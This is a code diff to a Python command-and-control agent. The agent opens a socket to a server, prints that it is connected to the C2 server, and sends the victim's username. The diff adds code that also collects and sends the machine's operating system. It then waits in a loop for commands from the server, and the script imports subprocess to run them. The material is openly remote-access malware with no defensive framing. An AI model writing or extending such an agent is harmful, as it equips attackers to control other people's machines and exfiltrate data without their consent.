@@ -1,5 +1,6 @@
 import socket
 import subprocess
+import platform
 import getpass  # Module to get the username
 
 def execute_command(command):
@@ -15,10 +16,12 @@ def main():
 
     try:
         username = getpass.getuser()  # Get the current username
+        client_os = platform.system()  # Get the client's operating system information
         agent_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         agent_socket.connect((host, port))
         print("\nConnected to C2 server as:", username)  # Print the username
         agent_socket.send(username.encode())  # Send the username to the server
+        agent_socket.send(client_os.encode())  # Send the client's operating system information to the server
 
         while True:
             command = agent_socket.recv(4096).decode().strip()
